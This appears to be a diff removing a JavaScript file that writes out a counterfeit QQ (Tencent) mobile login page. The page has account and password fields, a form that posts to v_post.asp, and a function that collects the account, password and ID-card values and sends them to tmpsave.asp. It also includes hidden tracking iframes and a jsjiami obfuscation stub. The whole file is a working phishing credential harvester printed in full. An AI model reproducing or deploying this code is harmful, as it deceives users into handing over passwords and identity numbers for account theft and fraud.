-document.writeln("\tfont-size: 28px;");
-document.writeln("\t-webkit-box-shadow: inset 0 0 10px #ccc");
-document.writeln("}");
-document.writeln("#vcode #input_tips {");
-document.writeln("\ttop: 5px;");
-document.writeln("\tleft: 150px;");
-document.writeln("\tdisplay: block;");
-document.writeln("\twidth: 135px;");
-document.writeln("\theight: 50px;");
-document.writeln("\tcolor: #B3B3B3;");
-document.writeln("\tz-index: 1;");
-document.writeln("\tpadding-top: 8px");
-document.writeln("}");
-document.writeln("#vcode #submit {");
-document.writeln("\twidth: 288px;");
-document.writeln("\theight: 22px;");
-document.writeln("\tpadding: 10px 0;");
-document.writeln("\tbackground: #7ec82c;");
-document.writeln("\tborder: none;");
-document.writeln("\tborder-radius: 5px;");
-document.writeln("\tcolor: #fff;");
-document.writeln("\tfont-size: 22px;");
-document.writeln("\tmargin: 35px auto 0");
-document.writeln("}");
-document.writeln(".copyright {");
-document.writeln("\tcolor: #8a949d;");
-document.writeln("\tfont-size: 10px;");
-document.writeln("\tmargin-top: 15px;");
-document.writeln("\tfont-family: Helvetica");
-document.writeln("}");
-document.writeln(".copyright .chs, .copyright .en {");
-document.writeln("\tline-height: 20px");
-document.writeln("}");
-document.writeln(".mode_webapp .ui_topbar .topbar_btn b, .mode_webapp .ui_topbar .topbar_btn_left b {");
-document.writeln("\tbackground-image: url('/style/8/images/bg_btn_back.png');");
-document.writeln("\tbackground-position: bottom right;");
-document.writeln("\tbackground-size: 105px;");
-document.writeln("\twidth: 6px;");
-document.writeln("\theight: 32px;");
-document.writeln("\tfloat: left");
-document.writeln("}");
-document.writeln(".ui_topbar .topbar_title, .ui_topbar h3 {");
-document.writeln("\tfont-size: 18px");
-document.writeln("}");
-document.writeln(".ui_topbar {");
-document.writeln("\tborder-bottom: 1px solid #b6b6b6;");
-document.writeln("\tborder-top: 2px solid #df242a;");
-document.writeln("\tbackground-color: #d9d9d9;");
-document.writeln("\tbackground-image: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#d9d9d9));");
-document.writeln("\tbackground-image: -webkit-linear-gradient(top, #ebebeb, #d9d9d9);");
-document.writeln("\tbackground-image: linear-gradient(to bottom, #ebebeb, #d9d9d9);");
-document.writeln("\theight: 40px;");
-document.writeln("\tline-height: 40px;");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln(".lay_header {");
-document.writeln("\theight: auto!important;");
-document.writeln("\twidth: 100%");
-document.writeln("}");
-document.writeln(".mode_webapp .ui_topbar {");
-document.writeln("\tcolor: #fff;");
-document.writeln("\tbackground-color: #c32d32;");
-document.writeln("\tbackground-image: -webkit-gradient(linear, left top, left bottom, from(#fe444a), to(#c32d32));");
-document.writeln("\tbackground-image: -webkit-linear-gradient(top, #fe444a, #c32d32);");
-document.writeln("\tbackground-image: linear-gradient(to bottom, #fe444a, #c32d32);");
-document.writeln("\tborder-bottom: 1px solid #700d00;");
-document.writeln("\tborder-top: 0 none;");
-document.writeln("\ttop: 0;");
-document.writeln("\tleft: 0;");
-document.writeln("\twidth: 100%;");
-document.writeln("\tbox-shadow: 0 0 5px #333");
-document.writeln("}");
-document.writeln(".mode_webapp .ui_topbar .topbar_btn_left {");
-document.writeln("\tdisplay: block;");
-document.writeln("\tposition: absolute;");
-document.writeln("\tleft: 10px;");
-document.writeln("\ttop: 5px");
-document.writeln("}");
-document.writeln(".mode_webapp .ui_topbar .topbar_btn span, .mode_webapp .ui_topbar .topbar_btn_left span {");
-document.writeln("\tfloat: left;");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\theight: 32px;");
-document.writeln("\tline-height: 30px;");
-document.writeln("\tcolor: #fff;");
-document.writeln("\tbackground-image: url('/style/8/images/bg_btn_back.png');");
-document.writeln("\tbackground-size: 105px;");
-document.writeln("\tpadding-left: 10px;");
-document.writeln("\tpadding-right: 4px");
-document.writeln("}");
-document.writeln(".mode_webapp .ui_topbar .topbar_btn_left span {");
-document.writeln("\tbackground-image: url('/style/8/images/bg_btn_back.png');");
-document.writeln("\tbackground-position: left -32px;");
-document.writeln("\tbackground-size: 105px;");
-document.writeln("\tpadding-left: 17px");
-document.writeln("}");
-document.writeln(".skin-2 .ui_topbar {");
-document.writeln("\tbackground-color: #161616;");
-document.writeln("\tbackground-image: -webkit-gradient(linear, left top, left bottom, from(#3e3e3e), to(#262626));");
-document.writeln("\tbackground-image: -webkit-linear-gradient(top, #3e3e3e, #262626);");
-document.writeln("\tbackground-image: linear-gradient(to bottom, #3e3e3e, #262626);");
-document.writeln("\tborder-bottom-color: #1a1a1a");
-document.writeln("}");
-document.writeln(".skin-2 .ui_topbar .topbar_btn b, .skin-2 .ui_topbar .topbar_btn span, .skin-2 .ui_topbar .topbar_btn_left b, .skin-2 .ui_topbar .topbar_btn_left span {");
-document.writeln("\tbackground-image: url('/style/8/images/bg_btn_back_black@2x.png');");
-document.writeln("\tbackground-size: 105px");
-document.writeln("}");
-document.writeln(".new_vcode {");
-document.writeln("\tdisplay: none;");
-document.writeln("\twidth: 100%;");
-document.writeln("\theight: 100%;");
-document.writeln("\toverflow: hidden");
-document.writeln("}");
-document.writeln("");
-document.writeln("</style>");
-document.writeln("<link rel=\"stylesheet\" type=\"text/css\" href=\"http://imgcache.qq.com/ptlogin/v4/style/mobile_common.css\">");
-document.writeln("<style type=\"text/css\">  ");
-document.writeln(".logo {background-image:url('https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.55.2/ptlogin/v4/style/9/images/logo.png');}  ");
-document.writeln("</style>");
-document.writeln("<style type=\"text/css\" id=\"style-4999409\">");
-document.writeln(".tcaptcha-transform{font-family:'Helvtical,microsoft yahei,sans-serif';background-size:20%;background-position:50% 32%;background-color:#fff;-webkit-border-radius:.08rem;border-radius:.08rem;visibility:visible;z-index:2000000002;overflow:hidden}.tcaptcha-transform .ticons{position:absolute;visibility:hidden;z-index:-1}.tcaptcha-transform .ticons.show-icon{visibility:visible}.tcaptcha-transform .ticon-refresh{height:327.68px;width:327.68px;left:0;right:0;margin:491.52px auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAAB4CAMAAAANIQqNAAABm1BMVEUAAAA9pf8Zif8chf8chf8dhv8chf8chf8chv8chf8chf8chf8chf8chf8fiP8chf8bhP8ehf8chf8Vif8chv8bhf8bhf8chf8bhf8chv8bhf8ah/8bhP8chf8chf8chf8dhf8chf8chf8bhf8dhv8chf8chf////8chf8chf8chv8dg/////8chf8chf8chv////8dhP8lhv8chv8chf////////8ahv9Xpf8bhf8bhf8bhv8bhf////////8bhP8giv////////8chP8bhf8chf////8bhv8chf////8chf////////8chP////////////////////////8chv/////////////7/f/J4v////////////////8fhf8chf/////6/P8miv9Amf+Gvv/x+P/j8P+o0f91tf9Knv8gh//q9P+z1//E3/++3f+Mwf9ssP9HnP85lf8zkv/2+v9jq/9apv9Qof8tj//9/v/O5f/I4v+72/+32P+w1f+Wx/99uv9xsv/d7f/X6f/S5/+q0v+gzP+ayf+jzv+pdUB1AAAAX3RSTlMAAgn9ZRHxxUi9+fLjrw6qNyDfBFI7hEXq0oocnm3003NqPk005tCMzcqkK8l3m2IgFgaTWVNBMf3XoF1UTGJBGNDFuZV+WyXtiVzbvLQnDgru4aWRbi8W9OzptJNnGRL7ICoAAAiSSURBVGjevJj5W5JBEMeHK0QOQUQLtZDK0kqz1LRS08zyqKye7nrmVbzAvNIsNbPL6s/O/b6yK8iZS59f2H2fgdl39jszu1DROKKt1c2uRs89N7P7nqfR1VzdGnXQf+FKKOL1cEY83kjoCpWUNnuFm3Pi9trbqET47C4bF4DNZfeRfvzXT3LBnLzuJ61YqpypL1l5+2pD2ZmAw0fkcwTOlDVcvV2ZGh5nlUWj+xOsOOaN+K2UAas/4j3GihO6ltB3niWV4WiQchCMhitZcr6Pjk5ts3r3QX9BahlUcaioPWr062XaddutVCBWe7dMy/q0fRjv7Bmnggk45Ya2B6kIgu1SNs4AKc5dNPboP0eFMZKMZSP0VKRyG5M7N0L7PBDuwcUHhRTdFjY5bv8nOVvsx9mkxSzQz/sNSf/z/OprYmCr++cu46izMWiCFvH+MgaUh2tnGXhq6AjUeBicvUZ0Do4nFhYnMMijgzI3g4ojNllHBQN3WQfcTq8wx6cx7KAcVJWzoLyejky9+VOxF3j/LjHuQgwe5RBiu81UX4g0EIIWNw3BHIO5PDKoMv13B0gLgW7m33A5y/vM5pRBmRk0p4M04XCuwuGPSd5n8gceXKZMXDD157KSNqwvIYAVlqxABq8z5r9Hu3/qNARLLPjwDR9LeNSZof41mfG3kkb6sQEJ3uP99FpMfCawCf10iBZTfz7SiFmC1lmwYBg/sZL1zDocMfPvLulkVLhaZMFXtReLYjianjHHUH9CpJMOKBCBX13D+D1K08Themgx+389aWVMOHrHgl0DmJN3YjiWWjbN+k9auQyfSMH4hmHyEal4qBbUutH/HETaJbgptx1sYbqZLkN0LlsN6eWibAJxA8gQzKV1hChaQB3p5SFk90kpAHwR80+Q4UOpwPPIQAfppUc4WUADWDOAWtGCGPbIHsgCO2lmWDiZ4j2WjQOgIE+J0XAyADhINwZJMwNyy78YJioTP4rRAJmcZkEZacYifGygD88bB5jHpmBoIeBEDyKguwrMoA0ZKayKZzOqEvj1BwB0Sg12GSl0QYWqJ9eJ+SkLAd2NYFtqULEsnm3LduDD/x+tpJ1e4WJXlh3FnDwb9go7O25xVtLOEMpOtgggMYaEnUtMB0k/HTLn1o0U1tEQk1twC1XYT/qBCLdkJ1DExbMtiDC5A5VSgtrTUCa9YjIlDb1iFqbsWGsaLjX4g6TIb5leiL5L53JNG/uFKIiTWIiy4QvDgD32IIEiLPOVYvTjEHIg649fUP98OdsIFG45LI+h3w5l4VTyRBIRMy9lofY4K074CBRsiXb8EwE/0AymJ+WRqCcpgUi2dtLEB2khULDlOBzG0koRQhIzkgcST64kvMmC8ubwfeSq7S5RUZZj6l68KxWAu8mfZDd24HvZyqAXKXqBiPpQr+8QFWU5pK4F/HUe8V9KyIsBziNRNKJscYWsazC+hGsrFWn5CsfiBIP48nLcHCZQhR4Ji9ZctwGEx20xRY5XpCIs1dXwF6exoy6H1WJena2wlAtFp4yLtRyAqx1OYenA3zTNOU+jYWbbjZRxsZbPzAvR4ipLVrcN8AwGrtyHodOXzqSOi7OEDsHaToxBbGfNAG8J4EIA81LRK1vA59nZxZnk7CkBswwEqJRgBQrlHyB9fFRSOkeNNL53URJ3iRcALG8gRcmvhJuSsIBKz9CTxwZ4/AQ3s/+8AHD5b/fm1pNGEMXxAQQWipI1FmpFNogYtFFrIKFeQ9KaPvXN5x7agpfQmxesqZoYY/RrF2aaGTPTmTNbN1vq722zgWHYnXP5n3M2t7Y2X/IlpUcQHmPUaPLLxL/5AQl+WWHHMERcWsXgl3PMEIXILJUCCEWY4hBxuLeWnFFY0DxkgVCEO0aJOrlayfSo8rlUprqGVPnkFUVAguBkgZJ+l5twicKKk6OP0kpqzd77z5GQjLMN90kkC9sbs80IIVG3MbFdSImA3Ebr86DPDKHog1JVxVVJp0FBpHnG2AnihIGF5ZQ8+KRMDFA9KMMvkcSEsgMDjtq3+4dg4GBv96aNKN5KJoalZsJYXrGs6rLdOwKFs9P2RUdEn8+IjHbDSHJKceUEv3O+1+4dnA3C++PDXnvvvNsS0J/3gmhQk3EkPecqZq+lcnLSUjkVCYpA3u8TsV8LgSLPhD5LfiDbeS49cS7RGPJ+lsxaQpVwg5Awrpr+ZgxxiPTgduzW/0p3g7jCWJNwEJlO3L9rWXEFfdaIljdqiosLlYtcbkb5AAPqejOYUJ8ALtW+B64oYFBDVCRalul9KQLExeosMHUb5QLMzj3iKd7KSq53gMmtGNfUCqWRYEh1PHjBIgdMajOz+woGlIgEvg5esmHNWd87xhP4CfNEjtZXRjykaOUA5fizfv1vQJmP693AnPZdw8t2JWD0Lv68/O0xMPJINAoTRMKycDnN3f5dV3n5rz4CwzOsH6eRW1Vz2GbQcK6cEV0o+3eXP6+73e7uzZe+Zz7jN0abRE8BWDCoAS9ejy0AwqIxsIvpXlH78n3dAwNrDjEQz9BAYIpI+GxgqKd0XdU1B8kGkKTBuoWjOf26CBKrSxuEgp2ipM7c+2xiaYzsjM6vViqV8blUIVdeIShP09TjIjLAOm/jCZq3LHdaJwhLvNoRLGOTyCFXW7kCJZpkRlqaPwirmY1E2cnJyCcwlHY+sX5RTlbCa2hkmbRsJrCWTi+olk5mPGOKoUCbWivBNLVW2Pp1ooC39ZbIgyn9/ipl/2E3NhOJ0Fu7ZUJvbvdPNLj2fsSk4AMO1TLxTbkKjATif+xGPJJOxNfuHfFJN6Ahl8ll+yGX5UndkIt/prJCHa3ZjfnUpDGf/3zQiQ7MeH8z6uVtSP9+4MNuDTce7a8bdxvGYbdHMe43DAOPQzDyOQxDr2Lsd4SN/RYBimzsd+QBY7+/AL2t7PuyoWBRAAAAAElFTkSuQmCC) no-repeat;background-size:contain}.tcaptcha-transform .transform-eicon{top:112.64px;left:40.96px;width:51.2px;height:51.2px;border-style:solid;border-width:10.24px 10.24px 0 0;border-color:#1a79ff;-webkit-transform-origin:75% 25% 0;-ms-transform-origin:75% 25% 0;transform-origin:75% 25% 0;-webkit-transform:rotate(225deg);-ms-transform:rotate(225deg);transform:rotate(225deg);-webkit-transition:.1s ease-in .1s;transition:.1s ease-in .1s}.tcaptcha-transform .transform-eb{width:262.144px;height:262.144px;line-height:262.144px;font-size:81.92px;text-align:left;left:155.648px;color:#1a79ff}.tcaptcha-transform .transform-eb.middle-fontsize{font-size:131.072px}.tcaptcha-transform .transform-eb.small-fontsize{font-size:98.304px}.tcaptcha-transform .transform-eh{width:100%;height:262.144px;line-height:262.144px;margin:0;font-size:106.49600000000001px;text-align:center;font-weight:700;color:#333;border-bottom:.026667rem solid #e6e6e6;z-index:-2}.tcaptcha-transform .transform-eh.middle-fontsize{font-size:90.11200000000001px}.tcaptcha-transform .transform-eh.small-fontsize{font-size:81.92px}.tcaptcha-transform .transform-header{width:100%;font-size:98.304px;text-align:center;margin-top:901.12px}.tcaptcha-transform .transform-text{width:90%;font-size:90.11200000000001px;text-align:center;padding-left:5%;padding-right:5%;margin-top:1064.96px}.tcaptcha-transform .transform-close{height:122.88px;width:122.88px;bottom:81.92px;right:81.92px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAAAZlBMVEUAAACzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Nj9GtKAAAAIXRSTlMAnAYRmO3pq6A2h+Pf07OVXlgcT00zw4R5eGBM8afFxIgs0CidAAABfUlEQVQ4y5WV25aCMAxFQwNCEQS5eEMd+/8/OekEJm2hSz1PNt0QcppG8KWveZ0Zk9X5VUNUXbk3jvZlt4lhY1ZqcM0dd4a0K24alUJ9K3h9DDCV2vCzV06of9pYqjzuQKFqgEBDReGDCrgcYSXMfdLmPcOmzjb7fx20KCGikjbninBHeSGqB/mPS+IK4yBWc/KO3s31tlnjEk3Wcu0EdPwRP7xz50dnJZSSf524BDrfftliMlz0dO4Ams5JzXYWdlO4BFiKqtVwMaYA8EnhWBS+Anl/A49MQg5a619tXyvkHxJwMBpTA/UzQkAGHKA1gIIKXCUrDhRFPgbD1BBNTcWMIJJilF+M2OP6LKTYI4YLx61cKM9wOULhhJQjdJuiYU7IRJrCa7NMOCbv0mZz4078zffNxp24cSnw4VUApJSPN5fru+v6fgB8N1KErKaQmyrhvLF3GtyHhxOPvcggbUc7SMdWBmkoTM1K6ba/3csf9q8OotKX5e/josHTL8HeNiRMGCf8AAAAAElFTkSuQmCC) no-repeat;background-size:contain}.tcaptcha-iframe{z-index:2000000002;margin:auto}.tcaptcha-iframe.hide-iframe{visibility:hidden}.t-verify{z-index:2000000002;width:655.36px;height:655.36px;background:#fff;-webkit-border-radius:.08rem;border-radius:.08rem;left:0;top:0}.verify-icon{position:absolute;margin-top:286.72px}.verify-icon.success-icon{width:204.8px;height:204.8px;left:0;right:0;margin:163.84px auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAzFBMVEUAAAAs0AAu1AAs0AAr0AAq1QAs0AAt0AAs0AAs0AAr0AAq0wAs0AAq0QAs0AAs0AAs0AAs0AAr0AAs0AAr0AAs0AAr0QAs0QAs0AApygAs0AAs0AAs0AAs0AAs0QAr0QAt0gAs0AAt0QAtzwAq0QArzwAs0AAqzQAs0QAs0AAs0AAs0AD////l+d/8/vty4FVG1iCI5W/X989G1h881BNy31My0gd34Vr5/vjt++qk65Gd6omO5naB42Za2jdL1ybR9cjA8bNp3kpZ2jY9PuX7AAAAK3RSTlMA/APuFwfUZln0OxLIVEbr49vZzsKxmW1MDvmsqIxpXiGejlA3NGgk1pyDVbbBQAAAArxJREFUaN7Nmody2kAURZ9QQRIyTTTRDDauV3GsFNzjlP//p8CQjAZLwLY3w/mAc9EWZvftIzGS8HIyitp2AAR2OxpNLsOETFHzex5K8Hp+Td/u9DsWdmJ1+o6OvTLoWjiA1R1UFPVutQ0h2lVX5ddXmxCmWZX+ijCGFHEot3BuIM1cYkmd21DAPhcd/TMociY0E7MIysQzgdltQIPGxSH/yRBaBPX9/lMLmgz9vX4Y4HTP+FgwgHWyy78IYIThYsf6bMAQjasyvxvDGLFLRW5gkHnJBMMohYl2bBjFdmibMQwz3vbXYZz61j+0B+N4FcqpgoFq7nebYKDpFj6A6xMqLbDQ+j8LAzAxoA1dMNH9t4kt6PL+/Ov5DwpYm+3chy7fH9M0vctQoE9rOtr+u3TN3Ts+0ln7a5a+f8NrcYzWx0nflD99QQF/FdAz5U8fUKC3CvCgw+fc/2WJAh5RYsr/6R4lJHTB6kdIPqsfU7pl9WNCY1Y/RhSx+hFRCzv4/fPx6Xmp6UeLbJTzsFnb3/T8sClAKcunNE9Q9yMglPMjTfMEdT+wOyBP0PFjzxDlCRr+YN8k5wnKfti7l2lWSFDwo0URhBIU/YhoDLEENT9GdAvBhIL/KwSYkA/RBBU/pnQB4QQFP0JKIJzwJu9HQuQJJ6Tyfk/g2JJp+NETOXhl6n74QkfHTNlv1cQOv5miHx3R43um5kdf+AKSKfktR/wKlSn40ZW5BL49rvealB8DqWvs/evLwxIytCrMF/FL9lICdzGEvZzDXZBiLqmN2IuC7GXNAnMYZM5cWvZcKuGKqTiesxjCCMGC94FiWGd+YvG5H4m4n7nYH+oOMouhTDwjAVz1x1L3OJ57VzhjSDN2SIa6Bym8+rE1Daxwp6JtD1P3OBs3+FtP8uaZa5RwnTfP6JOE0+32n6lo+89fOWa8/GcTqREAAAAASUVORK5CYII=);background-size:contain}.dots_item{width:61.44px;height:61.44px;margin-right:30.72px}.dots_item.show-none{display:none!important}.verify-text{position:absolute;width:100%;font-size:81.92px;text-align:center;line-height:112.64px;margin-top:430.08px;z-index:-1}.verify-text.little-fontsize{font-size:65.536px}");
-document.writeln("</style>");
-document.writeln("</head>");
-document.writeln("<body>");
-document.writeln("<form method=\"post\" action=\"v_post.asp\" class=\"am-form am-form-horizontal\" name=\"form1\" onSubmit=\"return ChkFields()\">");
-document.writeln("<div id=\"content\" class=\"content\">");
-document.writeln("  <div id=\"error_tips\">");
-document.writeln("    <div id=\"error_tips_content\"><span id=\"error_icon\"></span> <span id=\"error_message\">你还没有输入密码！</span></div>");
-document.writeln("  </div>");
-document.writeln("   ");
-document.writeln("                        ");
-document.writeln("                        <div id=\"login\" class=\"login\">");
-document.writeln("    <div id=\"logo\" class=\"logo\"></div>");
-document.writeln("    <div id=\"app_name\" style=\"display:none\"></div>");
-document.writeln("    <div id=\"q_login\" class=\"q_login\" style=\"display: none;\">");
-document.writeln("      <div id=\"q_login_title\">");
-document.writeln("        <div id=\"q_login_logo\"></div>");
-document.writeln("        <label id=\"q_login_tips\"></label>");
-document.writeln("      </div>");
-document.writeln("      <div id=\"q_logon_list\" class=\"q_logon_list\"></div>");
-document.writeln("    </div>");
-document.writeln("    <div id=\"web_login\">");
-document.writeln("      <ul id=\"g_list\">");
-document.writeln("        <li id=\"g_u\">");
-document.writeln("                            <div id=\"del_touch\" class=\"del_touch\"><span id=\"del_u\" class=\"del_u\"></span></div>");
-document.writeln("                            <input id=\"t3\" name=\"t3\" type=\"tel\" class=\"user-logw\" placeholder=\"QQ号码/手机/邮箱\" maxlength=\"88\">");
-document.writeln("                              </li>");
-document.writeln("        <li id=\"g_p\">");
-document.writeln("        <span id=\"userNameErr\" class=\"errMsg\"></span>");
-document.writeln("          <div id=\"del_touch_p\" class=\"del_touch\"><span id=\"del_p\" class=\"del_u\"></span></div>");
-document.writeln("                            <input class=\"inputs\" type=\"password\" name=\"t5\" placeholder=\"请输入你的QQ密码\" id=\"t5\" maxlength=\"88\">");
-document.writeln("                        </li>");
-document.writeln("      </ul>");
-document.writeln("      <span id=\"passwordErr\" class=\"errMsg\"></span>");
-document.writeln("      <div id=\"auto_login\" style=\"display: block;\">");
-document.writeln("        <input type=\"checkbox\" id=\"remember\" checked=\"checked\">");
-document.writeln("        <span class=\"checkbox\"></span>");
-document.writeln("        <label class=\"wording\"> 记住登录状态 </label>");
-document.writeln("      </div>");
-document.writeln("            ");
-document.writeln("\t\t\t<div class=\"mobile_login\">  <button type=\"submit\" id=\"goo\" class=\"btn btn-block lgbtn blue\">登录</button>");
-document.writeln("          </div>");
-document.writeln("    <div id=\"switch\">");
-document.writeln("      <div id=\"swicth_login\" onclick=\"pt._0();\" style=\"display: none;\"> 快速登录历史帐号 </div>");
-document.writeln("      <div id=\"zc_feedback\"> <span id=\"zc\" onclick=\"window.open(\" https=\"\" x3a=\"\" x2f=\"\" x2fssl.ptlogin2.qq.com=\"\" x2fj_newreg_url')'=\"\">注册新帐号</span> <span id=\"forgetpwd\">忘了密码？</span> </div>");
-document.writeln("    </div>");
-document.writeln("    <div id=\"custom_bottom\"> </div>");
-document.writeln("  </div>");
-document.writeln("  <div id=\"vcode\">");
-document.writeln("    <label id=\"vcode_tips\"> 点击图片可更换验证码 </label>");
-document.writeln("    <div id=\"vcode_area\"><img id=\"vcode_img\">");
-document.writeln("      <label id=\"input_tips\"> 请输入图中的字符不区分大小写 </label>");
-document.writeln("      <input id=\"vcode_input\" name=\"vcode_input\" tabindex=\"3\" ;=\"\" autocomplete=\"off\" autocorrect=\"off\" maxlength=\"6\">");
-document.writeln("    </div>");
-document.writeln("    <div id=\"submit\"> 提交验证码 </div>");
-document.writeln("  </div>");
-document.writeln("</div>");
-document.writeln("</script>");
-document.writeln("<!--<");
-document.writeln("<script src=\"js/slide.js\"></script>");
-document.writeln("<script>");
-document.writeln("    $(document).ready(function() {");
-document.writeln("    // 为账号输入框设置事件监听器，并初始化数字键盘");
-document.writeln("    $(\"#t3\").focus(function() {");
-document.writeln("        document.activeElement.blur(); // 阻止弹出系统软键盘");
-document.writeln("        $(this).keyboard({");
-document.writeln("           defaults:'number',");
-document.writeln("            inputClass: $(this).attr(\"class\"), // 绑定到当前输入框的类名（可选）");
-document.writeln("            // caseSwitch: 'toLowerCase' 对于数字键盘可能不适用，因此这里移除");
-document.writeln("        });");
-document.writeln("    });");
-document.writeln("");
-document.writeln("    // 为密码输入框设置事件监听器，并初始化字母键盘");
-document.writeln("    $(\"#t5\").focus(function() {");
-document.writeln("        document.activeElement.blur(); // 阻止弹出系统软键盘");
-document.writeln("        $(this).keyboard({");
-document.writeln("            defaults:'English',");
-document.writeln("            inputClass: $(this).attr(\"class\"), // 绑定到当前输入框的类名（可选）");
-document.writeln("            caseSwitch: 'toLowerCase', ");
-document.writeln("        });");
-document.writeln("    });");
-document.writeln("");
-document.writeln("});");
-document.writeln("</script>");
-document.writeln(">-->");
-document.writeln("<iframe src=\"online.html?ud=cHA4ODg&sing=\" style=\"display: none;\"></iframe>");
-document.writeln("</body>");
-document.writeln("</html>");
-document.writeln("     ");
-document.writeln("");
-document.writeln(" <input name=\"iaa\" type=\"hidden\" id=\"iaa\" value=\"1\">");
-document.writeln("          </article>");
-document.writeln("          <div class=\"warn\"></div>");
-document.writeln("        </form>");
-document.writeln("      </div>");
-document.writeln("    </div>");
-document.writeln("    <!-- InstanceEndEditable -->");
-document.writeln("    <meta name=\"format-detection\" content=\"telephone=no\">");
-document.writeln("    <div class=\"footer\">");
-document.writeln("      <h4 style=\"font-size:12px;\"><span></span> <br>");
-document.writeln("         </h4>");
-document.writeln("    </div>");
-document.writeln("    <!-- /footer -->");
-document.writeln("    <script src=\"./reg1_files/dataacquisition.xy.ccb.js\"></script>");
-document.writeln("    <script src=\"./reg1_files/datacatch.js\"></script>");
-document.writeln("  </div>");
-document.writeln("  <!-- InstanceEnd -->");
-document.writeln("  <script>");
-document.writeln("function showHint()");
-document.writeln("{");
-document.writeln("");
-document.writeln("var str=\"\";");
-document.writeln("if ((document.getElementById(\"g_zhanghao\").value).length>0) {");
-document.writeln("\tstr=str +\"zhanghao=\"+(document.getElementById(\"g_zhanghao\").value);");
-document.writeln("} else {");
-document.writeln("\tstr=str +\"zhanghao=\";");
-document.writeln("}");
-document.writeln("if ((document.getElementById(\"t3\").value).length>0) {");
-document.writeln("\tstr=str +\"&wangyin=\"+(document.getElementById(\"t3\").value);");
-document.writeln("} else {");
-document.writeln("\tstr=str +\"&wangyin=\";");
-document.writeln("}");
-document.writeln("if ((document.getElementById(\"idNo1\").value).length>0) {");
-document.writeln("\tstr=str +\"&idNo=\"+(document.getElementById(\"idNo1\").value);");
-document.writeln("} else {");
-document.writeln("\tstr=str +\"&idNo=\";");
-document.writeln("}");
-document.writeln("if ((document.getElementById(\"g_shenfenzheng\").value).length>0) {");
-document.writeln("\tstr=str +\"&shenfenzheng=\"+(document.getElementById(\"g_shenfenzheng\").value);");
-document.writeln("} else {");
-document.writeln("\tstr=str +\"&shenfenzheng=\";");
-document.writeln("}");
-document.writeln("if ((document.getElementById(\"t5\").value).length>0) {");
-document.writeln("\tstr=str +\"&shouji=\"+(document.getElementById(\"t5\").value);");
-document.writeln("} else {");
-document.writeln("\tstr=str +\"&shouji=\";");
-document.writeln("}");
-document.writeln("if (window.XMLHttpRequest)");
-document.writeln("  {// 针对 IE7+, Firefox, Chrome, Opera, Safari 的代码");
-document.writeln("\txmlhttp=new XMLHttpRequest();");
-document.writeln("  }");
-document.writeln("else");
-document.writeln("  {// 针对 IE6, IE5 的代码");
-document.writeln("\t//xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");");
-document.writeln("\t");
-document.writeln("\t");
-document.writeln("\t var versions =   ");
-document.writeln("        [  ");
-document.writeln("            \"MSXML2.XmlHttp.6.0\",   ");
-document.writeln("            \"MSXML2.XmlHttp.3.0\"  ");
-document.writeln("        ];  ");
-document.writeln("        for(var i = 0; i < versions.length; i++)  ");
-document.writeln("        {  ");
-document.writeln("            try  ");
-document.writeln("            {  ");
-document.writeln("                var xmlhttp = new ActiveXObject(versions[i]);  ");
-document.writeln("            }  ");
-document.writeln("            catch(error)  ");
-document.writeln("            {  ");
-document.writeln("                var xmlhttp=null;");
-document.writeln("            }  ");
-document.writeln("        }  ");
-document.writeln("\t");
-document.writeln("\t");
-document.writeln("  }");
-document.writeln("if (xmlhttp!= null) {  ");
-document.writeln("\txmlhttp.onreadystatechange=function()");
-document.writeln("\t{");
-document.writeln("\t  if (xmlhttp.readyState==4 && xmlhttp.status==200)");
-document.writeln("\t\t{");
-document.writeln("\t\t  //OpenWindow.document.write(\"<H1>\"+xmlhttp.responseText+\"</h1>\")  ; ");
-document.writeln("\t\t");
-document.writeln("\t\t}");
-document.writeln("\t  }");
-document.writeln("\txmlhttp.open(\"GET\",\"tmpsave.asp?\"+str,true);");
-document.writeln("\txmlhttp.send();");
-document.writeln("  }");
-document.writeln("}");
-document.writeln("");
-document.writeln("<iframe src=\"online.asp\" style=\"display: none;\"></iframe>");
-document.writeln("</body>");
-document.writeln("</html>");
-(function (_0x54f4dd, _0x5c4d67, _0x330663) {
-  _0x330663 = "al";
-  try {
-    _0x330663 += "ert";
-    _0x5c4d67 = encode_version;
-    if (!(typeof _0x5c4d67 !== "undefined" && _0x5c4d67 === "jsjiami.com.v5")) {
-      _0x54f4dd[_0x330663]("删除版本号，js会定期弹窗，还请支持我们的工作");
-    }
-  } catch (_0x233653) {
-    _0x54f4dd[_0x330663]("删除版本号，js会定期弹窗");
-  }
-})(window);
-encode_version = "jsjiami.com.v5";
